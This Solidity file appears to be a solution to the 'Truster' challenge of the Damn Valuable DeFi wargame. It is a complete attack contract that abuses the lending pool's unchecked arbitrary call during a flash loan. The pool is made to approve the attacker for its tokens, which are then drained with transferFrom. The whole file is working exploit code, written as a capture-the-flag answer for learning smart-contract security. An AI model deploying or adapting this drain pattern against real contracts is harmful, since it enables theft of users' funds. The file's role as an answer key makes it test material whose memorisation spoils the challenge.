// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { TrusterLenderPool } from "../truster/TrusterLenderPool.sol";
import { DamnValuableToken } from "../DamnValuableToken.sol";

contract TrusterAttack {
    function attack(TrusterLenderPool pool, DamnValuableToken token, uint256 amount) external {
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature("approve(address,uint256)", address(this), amount)
        );
        token.transferFrom(address(pool), msg.sender, amount);
    }
}
